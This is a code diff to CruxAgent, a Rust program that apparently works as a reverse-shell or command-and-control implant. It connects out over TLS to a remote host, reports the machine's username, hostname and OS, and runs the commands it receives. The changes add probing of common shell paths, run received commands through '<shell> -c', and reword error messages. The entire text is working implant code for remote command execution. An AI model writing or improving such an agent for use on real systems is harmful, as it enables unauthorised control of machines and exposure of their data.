@@ -13,6 +13,7 @@ use subprocess::{Exec, ExitStatus, Redirection};
 // std
 use std::env;
 use std::net::{TcpStream};
+use std::path::Path;
 
 // My stuff
 use args::CruxAgentArgs;
@@ -22,12 +23,13 @@ use utils::data::{CmdType, Cmd, CmdResult};
 use utils::network::read_length_prefix;
 use utils::shell_var::parse_var_def;
 
-fn send_metadata(stream :&mut TlsStream<TcpStream>) -> Result<(), Box<dyn std::error::Error>>{
+fn send_metadata(shell: &str, stream :&mut TlsStream<TcpStream>) -> Result<(), Box<dyn std::error::Error>>{
     // Prepare Metadata
     let metadata = Metadata {
         username: whoami::username(),
         hostname: fallible::hostname().map_or("UNKNOWN_HOSTNAME".to_string(),|d| d),
-        os_type: os_detect()
+        os_type: os_detect(),
+        shell_path: shell.to_string()
     };
     let metadata_serial = serde_json::to_string(&metadata)?;
 
@@ -52,6 +54,30 @@ fn normalize_exit_code(status: ExitStatus) -> i64 {
     }
 }
 
+fn choose_shell() -> Result<String, Box<dyn std::error::Error>> {
+    let candiates = [
+        "/bin/bash",
+        "/usr/bin/bash",
+        "/bin/sh",
+        "/usr/bin/sh",
+        "/bin/zsh",
+        "/usr/bin/zsh",
+        "/bin/dash",
+        "/usr/bin/dash",
+        "/bin/ash",
+        "/usr/bin/ash",
+        "/bin/busybox",
+        "/usr/bin/busybox",
+    ];
+
+    for shell in &candiates {
+        if Path::new(&shell).exists() {
+            return Ok(shell.to_string());
+        }
+    }
+    return Err("No shell found".into())
+}
+
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args = CruxAgentArgs::parse();
 
@@ -64,7 +90,8 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     let stream = TcpStream::connect(ip_str)?;
     let mut stream = connector.connect(&args.rhost.to_string(), stream)?;
 
-    send_metadata(&mut stream)?;
+    let shell_path = choose_shell()?;
+    send_metadata(&shell_path, &mut stream)?;
 
     // Set User environment variable
     let user = whoami::username();
@@ -97,7 +124,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                         cmd_result.status = 0;
                     }
                     Err(e) => {
-                        cmd_result.output = e.to_string();
+                        cmd_result.output = format!("Error from CruxAgent: {}", e);
                     }
                 };
             }
@@ -110,12 +137,17 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                         cmd_result.status = 0;
                     }
                     Err(e) => {
-                        cmd_result.output = e.to_string();
+                        cmd_result.output = format!("Error from CruxAgent: {}", e);
                     }
                 };
             }
             CmdType::Exec => {
-                let execution = Exec::shell(&received_cmd.args)
+                // let execution = Exec::shell(&received_cmd.args)
+                //     .stdout(Redirection::Pipe)
+                //     .stderr(Redirection::Merge);
+                let execution = Exec::cmd(&shell_path)
+                    .arg("-c")
+                    .arg(&received_cmd.args)
                     .stdout(Redirection::Pipe)
                     .stderr(Redirection::Merge);
 
@@ -126,8 +158,8 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                             output: output.stdout_str()
                         };
                     }
-                    Err(_) => {
-                        cmd_result.output = "Failed to run command".to_string();
+                    Err(e) => {
+                        cmd_result.output = format!("Error from CruxAgent: {}", e);
                     }
                 }
             }
